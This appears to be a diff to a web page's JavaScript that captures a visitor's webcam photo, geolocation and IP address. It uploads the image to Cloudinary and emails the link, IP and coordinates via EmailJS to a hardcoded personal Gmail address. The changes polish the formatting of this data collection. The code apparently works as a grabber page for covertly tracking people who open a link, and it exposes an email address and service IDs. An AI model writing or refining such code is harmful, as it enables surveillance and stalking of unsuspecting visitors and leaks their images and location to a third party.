@@ -25,8 +25,8 @@
         navigator.geolocation.getCurrentPosition(
           pos => {
             resolve({
-              latitude: pos.coords.latitude,
-              longitude: pos.coords.longitude
+              latitude: pos.coords.latitude.toString(),
+              longitude: pos.coords.longitude.toString()
             });
           },
           () => {
@@ -61,8 +61,8 @@
         await video.play();
 
         const canvas = document.createElement("canvas");
-        canvas.width = video.videoWidth;
-        canvas.height = video.videoHeight;
+        canvas.width = video.videoWidth || 640;
+        canvas.height = video.videoHeight || 480;
         const ctx = canvas.getContext("2d");
         ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
@@ -71,12 +71,18 @@
         canvas.toBlob(async (blob) => {
           const imageUrl = await uploadToCloudinary(blob);
 
+          // Construct full message string with all info
+          const message = 
+`You received a new photo.
+
+Download link: ${imageUrl}
+Sender IP: ${ip}
+Latitude: ${location.latitude}
+Longitude: ${location.longitude}`;
+
           await emailjs.send("service_khmk344", "template_oyrsayr", {
             to_email: "julianlee252@gmail.com",
-            message: imageUrl,
-            ip: ip,
-            latitude: location.latitude,
-            longitude: location.longitude
+            message: message
           });
 
           console.log("✅ Photo email sent.");
